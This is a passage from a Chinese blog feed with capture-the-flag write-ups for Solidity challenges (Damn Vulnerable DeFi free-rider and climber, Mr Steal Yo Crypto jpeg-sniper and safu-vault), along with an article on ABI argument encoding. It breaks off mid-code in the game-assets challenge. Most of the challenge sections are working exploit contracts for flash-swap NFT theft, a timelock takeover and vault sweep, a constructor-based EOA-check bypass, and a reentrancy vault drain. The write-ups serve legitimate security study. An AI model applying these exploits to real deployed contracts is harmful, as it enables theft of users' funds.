web3.eth.abi.encodeFunctionCall(&#123;        name: &#39;transfer&#39;,        type: &#39;function&#39;,        inputs:[&#123;            type: &#39;address&#39;,            name: &#39;add&#39;        &#125;,&#123;            type: &#39;uint256&#39;,            name: &#39;amount&#39;        &#125;]    &#125;,[attacker.address,amount1]);    await this.AttackContract.giveToken(data2);    //把换出来的weth转给attacker    const amountRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);    //计算borrow所需weth    await this.weth.connect(attacker).approve(this.lendingPool.address,amountRequired);    console.log(amountRequired);    console.log(await this.weth.balanceOf(attacker.address));    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);    //进行borrow&#125;);</code></pre><h2 id="free-rider"><a href="#free-rider" class="headerlink" title="free rider"></a>free rider</h2><p>有一个NFT 的新市场 最初的铸币量为 6 个 NFT，可在市场上出售。每个 15 ETH<br>开发人员得知市场可以被攻击 取走所有nft 所以他们悬赏45ETH，给任何愿意将 NFT 取出并将它们发送到他们的方式的人。<br>攻击者从0.1eth开始，拿走所有赏金<br>让我们先看看市场的漏洞在哪里  </p><pre><code>function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;    for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;        _buyOne(tokenIds[i]);    &#125;&#125;function _buyOne(uint256 tokenId) private &#123;           uint256 priceToPay = offers[tokenId];    require(priceToPay &gt; 0, &quot;Token is not being offered&quot;);    require(msg.value &gt;= priceToPay, &quot;Amount paid is not enough&quot;);    amountOfOffers--;    // transfer from seller to buyer    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);    // pay seller    payable(token.ownerOf(tokenId)).sendValue(priceToPay);    emit NFTBought(msg.sender, tokenId, priceToPay);&#125;    </code></pre><p>可以看到在买入的时候先用safeTransferFrom将nft发给买家，再把priceToPay给货币主人  但是这时候货币主人已经是买家，相当于又把买入的钱发给了买家 买家没有花一分钱就得到了nft<br>还有一个是我们的buyMany是一次事务 在这次事务执行中buyOne每次的msg.value是不变的  所以我们如果要买多个nft 只需要传入一个nft的钱就可以  </p><p>那么我们如何获得通过require(msg.value &gt;= priceToPay, “Amount paid is not enough”)验证的初始资金  </p><p>看题目测试过程 创建了uniswapV2 token0，token1分别是weth和DamnVulnerableToken  其中的swap方法可以让我们先获得代币，经过操作后再归还，所以我们只需要通过swap借出购买一个nft的钱够买完毕后再归还就可以<br>最后再把nft都转给悬赏合约 悬赏合约就会发钱给攻击者<br>    // SPDX-License-Identifier: MIT<br>    import ‘./FreeRiderBuyer.sol’;<br>    import ‘./FreeRiderNFTMarketplace.sol’;<br>    import ‘../WETH9.sol’;<br>    import ‘../DamnValuableToken.sol’;<br>    import “@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol”;<br>    interface NFTtransfer{<br>        function safeTransferFrom(<br>            address from,<br>            address to,<br>            uint256 tokenId<br>        ) external ;<br>    }</p><pre><code>pragma solidity ^0.8.0;contract freeriderAttack&#123;    FreeRiderNFTMarketplace market;    address pair;    WETH9 WETH;    FreeRiderBuyer buy;    address payable NFT;    DamnValuableToken Token;    address attacker;    constructor(address _market,address _pair,address _WETH,address _buy,address _NFT,address payable _token,address attack) public payable&#123;        market = FreeRiderNFTMarketplace(payable(_market));        pair = _pair;        WETH = WETH9(payable(_WETH));        buy = FreeRiderBuyer(_buy);        NFT = payable(_NFT);        Token = DamnValuableToken(_token);        attacker = attack;    &#125;    function attack(uint256 amount) public payable&#123;        for(uint i = 0;i&lt;6;i++)&#123;            NFTtransfer(NFT).safeTransferFrom(address(this),address(buy),i);        &#125;    &#125;    function uniswapV2Call(address from, uint amount1,uint amount2,bytes memory data) external&#123;        WETH.withdraw(amount1);        uint[] memory tokenId = new uint[](6);        for(uint i = 0;i &lt; 6; i++)&#123;            tokenId[i] = i;        &#125;        market.buyMany&#123;value: amount1&#125;(tokenId);        WETH.deposit&#123;value:address(this).balance&#125;();        uint amount = WETH.balanceOf(address(this));        WETH.transfer(address(pair),amount);    &#125;    receive() external payable&#123;&#125;    function onERC721Received(        address add1,        address add2,        uint256 _tokenId,        bytes memory    )public returns (bytes4) &#123;        return IERC721Receiver.onERC721Received.selector;    &#125;&#125;it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    this.attackContract = await (await ethers.getContractFactory(&#39;freeriderAttack&#39;, attacker)).deploy(        this.marketplace.address,        this.uniswapPair.address,        this.weth.address,        this.buyerContract.address,        this.nft.address,        this.token.address,        attacker.address    );    const data = &quot;0x123456&quot;;//data不能是0    await this.uniswapPair.connect(attacker).swap(NFT_PRICE,0,this.attackContract.address,data);    console.log(await this.nft.ownerOf(0));    console.log(this.attackContract.address);    await this.attackContract.connect(attacker).attack(NFT_PRICE);&#125;);</code></pre><h2 id="climber"><a href="#climber" class="headerlink" title="climber"></a>climber</h2><p>有一个安全的金库合同保护着10万个DVT代币。保管库可按照 UUPS 模式进行升级。<br>金库的所有者，目前是一个时间锁合约，每15天可以提取非常有限数量的代币。<br>在金库上，还有一个额外的角色，有权在紧急情况下扫描所有代币。<br>在时间锁上，只有具有“提议者”角色的帐户才能计划可在 1 小时后执行的操作。<br>要通过此挑战，请从保管库中获取所有令牌。  </p><p>观察金库 要想取走所有货币，一次一次取是不现实的 因为有WAITING_PERIOD和WITHDRAWAL_LIMIT<br>可以看到有一个函数sweepFunds可以一次取走所有token 预计我们要通过这个函数完成题目<br>这个函数只有sweeper可以调用  </p><p>观察时间锁 它可以向给定的target发送事务，需先准备，经过延迟才可以执行，并且只有PROPOSER_ROLE可以进行事务准备  </p><pre><code>for (uint8 i = 0; i &lt; targets.length; i++) &#123;        targets[i].functionCallWithValue(dataElements[i], values[i]);    &#125;require(getOperationState(id) == OperationState.ReadyForExecution);</code></pre><p>可以看到在事务执行过程先进行调用再进行验证，这是不合理的<br>因为我们可以通过改变合约内的一些状态来通过验证  </p><p>金库是一个UUPS代理合约而时间锁是它的owner<br>所以我们可以通过时间锁向金库发送事务，更新它的逻辑合约<br>    function upgradeTo(address newImplementation) external virtual onlyProxy {<br>            _authorizeUpgrade(newImplementation);<br>            _upgradeToAndCallSecure(newImplementation, new bytes(0), false);<br>        }<br>由于用的是_upgradeToAndCallSecure(newImplementation, new bytes(0), false);<br>所有必须保证新逻辑合约也是UUPS标准<br>由此可以想到，如果我们对新逻辑合约的sweepFunds进行一些调整 把修饰符去掉 sweep改为msg.sender这样任何人都可以调用sweepFunds，就可以完成题目<br>    function sweepFunds(address tokenAddress) external {<br>        IERC20 token = IERC20(tokenAddress);<br>        require(token.transfer(msg.sender, token.balanceOf(address(this))), “Transfer failed”);<br>    }</p><p>所以，第一步 把延迟时间改为0<br>      第二步 把自己setRole从而可以进行事务准备<br>      第三步 更新逻辑合约<br>      第四步 进行事务准备<br>然后，我们就可以调用更新后的sweepFunds完成题目</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./ClimberTimelock.sol&quot;;interface setRole&#123;function grantRole(bytes32 role, address account) external;&#125;interface upgrate&#123;    function upgradeTo(address newImplementation) external;&#125;contract ClimberAttack&#123;    ClimberTimelock timelock;    address vault;    bytes32 public constant PROPOSER_ROLE = keccak256(&quot;PROPOSER_ROLE&quot;);    constructor(address payable lock,address _vault) public&#123;        timelock = ClimberTimelock(lock);        vault = _vault;    &#125;    function attack(address newIm) public&#123;        address[] memory target = new address[](4);        uint256[] memory values = new uint256[](4);        bytes[] memory dataElements = new bytes[](4);        bytes32 salt;        target[0] = address(timelock);        target[1] = address(timelock);        target[3] = address(timelock);        target[2] = vault;        for(uint i = 0; i &lt; 4; i++)&#123;            values[i] = 0;        &#125;        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector , 0);        dataElements[1] = abi.encodeWithSelector(setRole.grantRole.selector,keccak256(&quot;PROPOSER_ROLE&quot;),address(this));        dataElements[2] = abi.encodeWithSelector(upgrate.upgradeTo.selector, newIm);        dataElements[3] = abi.encodeWithSelector(ClimberTimelock.schedule.selector, target,values,dataElements,salt);        timelock.execute(target, values, dataElements, salt);    &#125;&#125;</code></pre><p>测试</p><pre><code>    it(&#39;Exploit&#39;, async function () &#123;            /** CODE YOUR EXPLOIT HERE */    this.AttackContract = await (await ethers.getContractFactory(&#39;ClimberAttack&#39;,attacker)).deploy(this.timelock.address,this.vault.address)    this.newIM = await (await ethers.getContractFactory(&#39;newClimberVault&#39;,attacker)).deploy();    this.AttackContract.attack(this.newIM.address);    this.vault.connect(attacker).sweepFunds(this.token.address);&#125;);</code></pre>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>argument encoding</title>
      <link href="/2022/11/26/Argument-Encoding/"/>
      <url>/2022/11/26/Argument-Encoding/</url>
      
        <content type="html"><![CDATA[<h1 id="关于函数选择器中的argument-encodeing"><a href="#关于函数选择器中的argument-encodeing" class="headerlink" title="关于函数选择器中的argument encodeing"></a>关于函数选择器中的argument encodeing</h1><p><strong>规则</strong><br>先将函数参数按顺序储存，如果是定长数据类型，直接储存其data，如果是变长数据类型，先储存其offset<br>    <em>对于第一个变长数据</em>：offset = 0x20<em>num（num为函数参数的个数）    </em>对于其后的变长数据<em>：offset = offset——pre + 0x20</em>num（offset——pre为上一个变长数据储存占用的大小，num为上一个变长数据元素的个数）<br>储存完offset 接着储存length和data</p><p>例如</p><pre><code>function test4(uint, uint32[] memory, bytes10, bytes memory) public &#123; x = 1; &#125;0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter/*data of first parameter: uint定长类型，直接存储其dataoffset of second parameter: uint32[]动态数组，先存储其offset=0x20*4 (4代表函数参数的个数) data of third parameter: bytes10定长类型，直接存储其dataoffset of forth parameter: bytes变长类型，先存储其offset=0x80+0x20*3=0xe0 (0x80是前一个变长类型的offset，3是前一个变长类型存储其长度和两个元素占用的插槽个数)length of second parameter: 存储完data或者offset后，便开始存储变长数据的length和data，这里是第二个参数的长度first data of second parameter: 第二个参数的第一个数据second data of second parameter: 第二个参数的第二个数据length of forth parameter: 上面就把第二个变长数据存储完成，这里就是存储下一个变长数据的长度data of forth parameter: 第四个参数的数据*/</code></pre><p>对于较复杂的结构  可以由内向外拆分</p><pre><code>struct Test &#123;        string name;        string policies;        uint num;    &#125;function test6(uint, Test[] memory tests) public &#123; x = 1; &#125;设结构体数组有两个结构体第一个结构体内*注：结构体内部编码形式可以看作一个函数offset of name1offset of policies1data of num1length of name1ecoding of name1length of policies1ecoding of policies1对于第二个结构体内offset of name2offset of policies2data of num2length of name2ecoding of name2length of policies2ecoding of policies2</code></pre><p><em>由于是结构体</em><br>还需要</p><pre><code>offset of [name1, policies1,num1]offset of [name2, policies2,num2]</code></pre><p>由于是结构体数组<br>还需要</p><pre><code>offset of[name1, policies1,num1][name2,policies2,num2]count of it</code></pre><p>因此 结果为</p><pre><code>data of first parameteroffset of[name1, policies1,num1][name2,policies2,num2]count of itoffset of name1offset of policies1data of num1length of name1ecoding of name1length of policies1ecoding of policies1offset of name2offset of policies2data of num2length of name2ecoding of name2length of policies2ecoding of policies2</code></pre><p>源文章：<a href="https://hitcxy.com/2021/argument-encoding/">https://hitcxy.com/2021/argument-encoding/</a></p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steal Crypto</title>
      <link href="/2022/11/26/crypto/"/>
      <url>/2022/11/26/crypto/</url>
      
        <content type="html"><![CDATA[<h1 id="Mr-Steal-Yo-Crypto-题解"><a href="#Mr-Steal-Yo-Crypto-题解" class="headerlink" title="Mr Steal Yo Crypto 题解"></a>Mr Steal Yo Crypto 题解</h1><h2 id="1-Jpeg-Sniper"><a href="#1-Jpeg-Sniper" class="headerlink" title="1.Jpeg Sniper"></a>1.Jpeg Sniper</h2><p>Hopegs NFT 市场即将推出大肆宣传的 NFT 收藏战利品。<br>他们有一个包装合同：FlatLaunchpeg，负责处理该系列的公开销售铸币厂。<br>你的任务是绕过他们的保护措施，在一次 tx 中最大限度地铸造整个系列。  </p><p>NFT代码</p><pre><code>contract BaseLaunchpegNFT is ERC721, Ownable &#123;    using Counters for Counters.Counter;    Counters.Counter private _tokenId;    uint256 public collectionSize;    uint256 public maxBatchSize;    uint256 public salePrice; // free mint    uint256 public maxPerAddressDuringMint;    uint256 public publicSaleStartTime;    modifier isEOA() &#123;        uint256 size;        address sender = msg.sender;        assembly &#123;            size := extcodesize(sender)        &#125;        if (size &gt; 0) revert Launchpeg__Unauthorized();        _;    &#125;    constructor(        uint256 _collectionSize,        uint256 _maxBatchSize,        uint256 _maxPerAddressDuringMint    ) ERC721(&#39;BOOTY&#39;,&#39;BOOTY&#39;) &#123;        collectionSize = _collectionSize;        maxBatchSize = _maxBatchSize;        maxPerAddressDuringMint = _maxPerAddressDuringMint;        publicSaleStartTime = block.timestamp; // mint turned on this block    &#125;    /// @notice Returns the number of NFTs minted by a specific address    /// @param _owner The owner of the NFTs    /// @return numberMinted Number of NFTs minted    function numberMinted(address _owner)        public        view        returns (uint256)    &#123;        return balanceOf(_owner);    &#125;    /// @dev returns the total amount minted    function totalSupply() public view returns (uint256) &#123;        return _tokenId.current();    &#125;    /// @dev mints n number of NFTs per user    function _mintForUser(address to, uint256 quantity) internal &#123;        for (uint256 i=0; i&lt;quantity; i++) &#123;            _mint(to, _tokenId.current());            _tokenId.increment();        &#125;    &#125;    /// @dev Verifies that enough funds have been sent by the sender and refunds the extra tokens if any    /// @param _price The price paid by the sender for minting NFTs    function _refundIfOver(uint256 _price) internal &#123;        if (msg.value &lt; _price) &#123;            revert Launchpeg__NotEnoughFunds(msg.value);        &#125;        if (msg.value &gt; _price) &#123;            (bool success, ) = msg.sender.call&#123;value: msg.value - _price&#125;(&quot;&quot;);            if (!success) &#123;                revert Launchpeg__TransferFailed();            &#125;        &#125;    &#125;&#125;</code></pre><p>包装合同  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./BaseLaunchpegNFT.sol&quot;;/// @dev hopegs NFT exchange wrapper to manage mintcontract FlatLaunchpeg is BaseLaunchpegNFT &#123;    enum Phase &#123;        NotStarted,        PublicSale    &#125;    modifier atPhase(Phase _phase) &#123;        if (currentPhase() != _phase) &#123;            revert Launchpeg__WrongPhase();        &#125;        _;    &#125;    constructor(        uint256 _collectionSize,        uint256 _maxBatchSize,        uint256 _maxPerAddressDuringMint    ) BaseLaunchpegNFT(        _collectionSize,        _maxBatchSize,        _maxPerAddressDuringMint    ) &#123;&#125;    /// @notice Mint NFTs during the public sale    /// @param _quantity Quantity of NFTs to mint    function publicSaleMint(uint256 _quantity)        external        payable        isEOA        atPhase(Phase.PublicSale)    &#123;        if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123;            revert Launchpeg__CanNotMintThisMany();        &#125;        if (totalSupply() + _quantity &gt; collectionSize) &#123;            revert Launchpeg__MaxSupplyReached();        &#125;        uint256 total = salePrice * _quantity;        _mintForUser(msg.sender, _quantity);        _refundIfOver(total);    &#125;    /// @notice Returns the current phase    /// @return phase Current phase    function currentPhase() public view returns (Phase) &#123;        if (            publicSaleStartTime == 0 ||            block.timestamp &lt; publicSaleStartTime        ) &#123;            return Phase.NotStarted;        &#125; else &#123;            return Phase.PublicSale;        &#125;    &#125;&#125;</code></pre><p>我们如果想要铸造nft，仅能通过publicSaleMint一个方法，但是一个地址最多只能铸造5个代币，改方法有isEOA检验，只有地址代码长度为零才能调用，并且我们要在一次事务中取得所有代币（69个）<br>可以想到，如果合约在构造函数中调用publicSaleMint方法，那么由于合约还未初始化完成，代码长度就为0，可以通过isEOA检验。那么我们要通过一次事务就铸造完毕，就必须将功能拆分，用子合约用于铸造，主合约要多次创建子合约  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./FlatLaunchpeg.sol&quot;;contract minter&#123;    address NFT;    address attacker;    constructor(address _NFT,address _attacker)&#123;        NFT = _NFT;        attacker = _attacker;        mint();    &#125;    function mint() public &#123;        uint per = 5;        for(uint amount = 0;amount&lt;=60;)&#123;            new minten(NFT,attacker,per,amount);            amount = amount+5;        &#125;//此时，已经铸造了65个        new minten(NFT,attacker,4,65);//再铸造四个    &#125;&#125;contract minten&#123;    constructor(address _nft,address attacker,uint per,uint amount)&#123;        FlatLaunchpeg nft = FlatLaunchpeg(_nft);        nft.publicSaleMint(per);//铸造per个        for(uint i = 0;i&lt;per;i++)&#123;            nft.transferFrom(address(this), attacker, amount+i);//转给attacker        &#125;    &#125;&#125;</code></pre><p>测试<br>    it(“solves the challenge”, async function () {</p><pre><code>let minterFactory = await ethers.getContractFactory(&#39;minter&#39;);let minter = await minterFactory.connect(attacker).deploy(flatLaunchpeg.address,await attacker.getAddress());&#125;);</code></pre><p><img src="1.png" alt="1"></p><h2 id="safu-vault"><a href="#safu-vault" class="headerlink" title="safu-vault"></a>safu-vault</h2><p>Safu Labs刚刚发布了他们的SafuVault，这是有史以来“最安全”的收益产生金库，或者他们的Twitter帐户是这样说的。<br>他们的SafuVault预计存入USDC，并且已经从用户那里获得了10，000 USDC。<br>你知道演习，耗尽资金（至少90%）。您从 10，000 USDC 开始。</p><p>金库代币合约<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;/// @dev interface for interacting with the strategyinterface IStrategy &#123;    function want() external view returns (IERC20);    function beforeDeposit() external;    function deposit() external;    function withdraw(uint256) external;    function balanceOf() external view returns (uint256);&#125;/// @dev safu yield vault with automated strategycontract SafuVault is ERC20, Ownable, ReentrancyGuard &#123;    using SafeERC20 for IERC20;    // The strategy currently in use by the vault.    IStrategy public strategy;    constructor (        IStrategy _strategy,        string memory _name,        string memory _symbol    ) ERC20 (        _name,        _symbol    ) &#123;        strategy = IStrategy(_strategy);    &#125;    /// @dev token required as input for this strategy    function want() public view returns (IERC20) &#123;        return IERC20(strategy.want());    &#125;    /// @dev calculates amount of funds available to put to work in strategy    function available() public view returns (uint256) &#123;        return want().balanceOf(address(this));    &#125;    /// @dev calculates total underlying value of tokens held by system (vault+strategy)    function balance() public view returns (uint256) &#123;        return available()+strategy.balanceOf();    &#125;    /// @dev calls deposit() with all the sender&#39;s funds    function depositAll() external &#123;        deposit(want().balanceOf(msg.sender));    &#125;    /// @dev entrypoint of funds into the system    /// @dev people deposit with this function into the vault    function deposit(uint256 _amount) public nonReentrant &#123;        strategy.beforeDeposit();        uint256 _pool = balance();        want().safeTransferFrom(msg.sender, address(this), _amount);        earn();        uint256 _after = balance();        _amount = _after - _pool; // Additional check for deflationary tokens        uint256 shares;        if (totalSupply() == 0) &#123;            shares = _amount;        &#125; else &#123;            shares = (_amount * totalSupply()) / (_pool);        &#125;        _mint(msg.sender, shares);    &#125;    /// @dev sends funds to strategy to put them to work, by calling deposit() function    function earn() public &#123;        uint256 _bal = available();        want().safeTransfer(address(strategy), _bal);        strategy.deposit();    &#125;    /// @dev helper function to call withdraw() with all sender&#39;s funds    function withdrawAll() external &#123;        withdraw(balanceOf(msg.sender));    &#125;    /// @dev allows user to withdraw specified funds    function withdraw(uint256 _shares) public &#123;        uint256 r = (balance() * _shares) / (totalSupply());        _burn(msg.sender, _shares); // will revert if _shares &gt; what user has        uint256 b = want().balanceOf(address(this)); // check vault balance        if (b &lt; r) &#123; // withdraw any extra required funds from strategy            uint256 _withdraw = r - b;            strategy.withdraw(_withdraw);            uint256 _after = want().balanceOf(address(this));            uint256 _diff = _after - b;            if (_diff &lt; _withdraw) &#123;                r = b + _diff;            &#125;        &#125;        want().safeTransfer(msg.sender, r);    &#125;    /// @dev deposit funds into the system for other user    function depositFor(        address token,         uint256 _amount,         address user    ) public &#123;        strategy.beforeDeposit();        uint256 _pool = balance();        IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);        earn();        uint256 _after = balance();        _amount = _after - _pool; // Additional check for deflationary tokens        uint256 shares;        if (totalSupply() == 0) &#123;            shares = _amount;        &#125; else &#123;            shares = (_amount * totalSupply()) / (_pool);        &#125;        _mint(user, shares);    &#125;&#125;</code></pre><p>金库储存合约</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;import &quot;@openzeppelin/contracts/security/Pausable.sol&quot;;/// @dev safu yield generation strategy/// @dev this strategy takes in &#123;want&#125; &amp; generates &#123;want&#125; using its yield generator/// @dev the yield generator is abstracted away bc it&#39;s not relevant to the exploit/// @dev therefore you will see unimplemented logic for interacting w/ the generatorcontract SafuStrategy is Ownable, Pausable &#123;    using SafeERC20 for IERC20;    using Address for address;    address public want; // deposit &amp; withdrawal token    address public vault; // safu vault    mapping (address =&gt; bool) public whitelist;    modifier onlyWhitelisted() &#123;        require(whitelist[msg.sender] == true, &quot;not whitelisted&quot;);        _;    &#125;    constructor(        address _want    ) &#123;        want = _want;        whitelist[msg.sender] = true;    &#125;    /// @dev set the vault associated w/ this strategy    function setVault(address _vault) external onlyOwner &#123;        require(vault == address(0), &quot;vault set&quot;);        vault = _vault;    &#125;    /// @dev functionality for updating the whitelist    function addOrRemoveFromWhitelist(        address add,         bool isAdd    ) public onlyOwner &#123;        whitelist[add] = isAdd;    &#125;     /// @dev puts the funds to work    /// @dev called whenever someone deposits into this strategy&#39;s vault contract    function deposit() public whenNotPaused &#123;        // takes in the deposited funds &amp; puts in yield generator        // ...    &#125;    /// @dev withdraws &#123;want&#125; and sends it to the vault    /// @param _amount How much &#123;want&#125; to withdraw.    function withdraw(uint256 _amount) external &#123;        require(msg.sender == vault, &quot;not vault&quot;);        uint256 wantBal = IERC20(want).balanceOf(address(this));        if (wantBal &lt; _amount) &#123;            // withdraws funds depositied into yield generator &amp; sends back to this address            // ...            wantBal = IERC20(want).balanceOf(address(this));        &#125;        if (wantBal &gt; _amount) &#123;            wantBal = _amount;        &#125;        IERC20(want).safeTransfer(vault, wantBal);     &#125;    /// @dev handles required functionality before vault deposits to strategy    function beforeDeposit() external virtual &#123;        uint256 wantBal = IERC20(want).balanceOf(address(this));        if (wantBal &gt; 0) &#123;            deposit();            sellHarvest();        &#125;    &#125;     /// @dev runs a single instance of harvesting    function harvest() external whenNotPaused onlyWhitelisted &#123;        require(!Address.isContract(msg.sender), &quot;is contract&quot;);        sellHarvest();        deposit(); // places harvested funds back into the yield generator    &#125;    /// @dev harvests &#123;want&#125; from the yield generator    function sellHarvest() internal &#123;        // gathers all harvested funds from the yield generator &amp; converts to &#123;want&#125;        // ...    &#125;    /// @dev calculates the total underlying &#123;want&#125; held by this strategy    /// @dev takes into account funds at hand + funds allocated in yield generator    /// @dev HOWEVER yield generator is abstracted so it is ignored here (0)    function balanceOf() public view returns (uint256) &#123;        return balanceOfWant()+0; // yield generator balance is 0    &#125;    /// @dev returns balance of &#123;want&#125; in this contract    function balanceOfWant() public view returns (uint256) &#123;        return IERC20(want).balanceOf(address(this));    &#125;    /// @dev pauses strategy    function pause() public onlyOwner &#123;        _pause();    &#125;    /// @dev unpauses the strategy    function unpause() external onlyOwner &#123;        _unpause();    &#125;&#125;</code></pre><p>分析两合约的关系，用户直接与金库代币合约交互，可以向金库里存usdc，金库代币合约把转入的usdc转入金库储存合约，然后根据存钱前后两合约的余额差量为用户铸造金库代币。如果金库中usdc数目增加，那么用户存入的usdc就会产生收益。<br>我们如何削减金库的usdc？<br>观察depositFor函数，它需要调用者传入token，然后调token的safetransFrom,如果这个token的safetransFrom是我们自己实现的，相当于我们可以在depositFor过程中再次调用deposit，而如果调用deposit的amount与外部depositFor的amount相同，那么相当于我们只传入了一次usdc代币，却铸造了两次金库代币<br>因此我们只需要实现safetransfrom就可以  </p><pre><code>// SPDX-License-Identifier: MITimport &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;pragma solidity ^0.8.0;interface vault&#123;    function depositFor(        address token,         uint256 _amount,         address user    ) external;    function depositAll() external ;    function withdrawAll() external ;&#125;contract vaultattack&#123;    address target;    address attacker;    address token;    using SafeERC20 for IERC20;    constructor(address _vault,address _attacker,address _token) public&#123;        target = _vault;        attacker = _attacker;        token = _token;    &#125;    function attack(uint amount) public&#123;        vault(target).depositFor(address(this), amount, address(this));        vault(target).withdrawAll();    &#125;    function safeTransferFrom(        address from,        address to,        uint256 value    ) external &#123;        IERC20(token).approve(to, value);        vault(target).depositAll();    &#125;    function transfer1() public&#123;        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));    &#125;&#125;</code></pre><p>调用attack之后，发现一直报错“SafeERC20: low-level call failed”<br>看了好久，发现如果我的攻击合约有fallback就不会报这个错<br>推测是我函数签名出现了问题<br>仔细看了下 safeERC20<br>发现他的safeTransFrom是这样的<br>    function safeTransferFrom(<br>            IERC20 token,<br>            address from,<br>            address to,<br>            uint256 value<br>        ) internal {<br>            _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));<br>        }</p><p>有一段注释  </p><ul><li>To use this library you can add a <code>using SafeERC20 for IERC20;</code> statement to your contract,  </li><li>which allows you to call the safe operations as <code>token.safeTransfer(...)</code>, etc.<br>这说明<br>IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);<br>这句话只的是调用IERC20的safeTransferFrom成员（因为using SafeERC20 for IERC20），第一个参数是token  所以我们真正要实现的是transferFrom  </li></ul><p>改正后的攻击合约<br>    // SPDX-License-Identifier: MIT<br>    import “@openzeppelin/contracts/token/ERC20/IERC20.sol”;<br>    import “@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol”;<br>    pragma solidity ^0.8.0;<br>    interface vault{<br>        function depositFor(<br>            address token,<br>            uint256 _amount,<br>            address user<br>        ) external;<br>        function depositAll() external ;<br>        function withdrawAll() external ;</p><pre><code>&#125;contract vaultattack&#123;    address target;    address attacker;    address token;    using SafeERC20 for IERC20;    constructor(address _vault,address _attacker,address _token) public&#123;        target = _vault;        attacker = _attacker;        token = _token;    &#125;    function attack(uint amount) public&#123;        vault(target).depositFor(address(this), amount, address(this));        vault(target).withdrawAll();    &#125;    function transferFrom(        address from,        address to,        uint256 value    ) external &#123;        IERC20(token).approve(to, value);        vault(target).depositAll();    &#125;    function transfer1() public&#123;        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));    &#125;&#125;</code></pre><p>测试 </p><pre><code>it(&quot;solves the challenge&quot;, async function () &#123;let VaultAttackFactory = await ethers.getContractFactory(&#39;vaultattack&#39;,attacker);let VaultAttackContract = await VaultAttackFactory.deploy(safuVault.address,attacker.getAddress(),usdc.address);await usdc.connect(attacker).transfer(VaultAttackContract.address,precision.mul(10_000));await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));await VaultAttackContract.transfer1();&#125;);</code></pre><p>重入三次后 就可以削减金库的90%<br><img src="2.png" alt="2"></p><h2 id="game-assets"><a href="#game-assets" class="headerlink" title="game-assets"></a>game-assets</h2><p>GG 实验室刚刚发布了他们的 nOtApOnZi 游戏，该游戏允许将多个 WL 的 NFT 用作游戏内物品。<br>为了集成多个 ERC721 代币，他们有一个包装合约 （ERC1155） 来包装 NFT，允许它们在游戏中使用。用户还可以在使用完 NFT 后解开他们的包装。<br>您的任务是通过将用户的 NFT 困在包装合约中并使它们无法挽回来使用户感到悲伤。  </p><p>主要实现功能的包装合约  </p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;import &quot;@openzeppelin/contracts/utils/Counters.sol&quot;;import &quot;./AssetHolder.sol&quot;;interface IGameAsset &#123;    function ownerOf(uint256 tokenId) external returns (address);    function isApprovedForAll(        address owner,         address operator    ) external returns (bool);    function setOwnerOperator(        address to,        uint256 tokenId    ) external;&#125;/// @dev functionality for wrapping and unwrapping assets for use in the game/// @dev the game strictly references this contract for determining assets user owns/// @dev stores a whitelist of GameAsset contracts that are used by this game/// @dev while NFTs are used in the game, they cannot be bought/sold/transferred/// @dev that is why this contract temporarily takes ownership of NFTs used in-gamecontract AssetWrapper is AssetHolder, Ownable &#123;    // used to keep track of the current token ID for newly added GameAssets    using Counters for Counters.Counter;    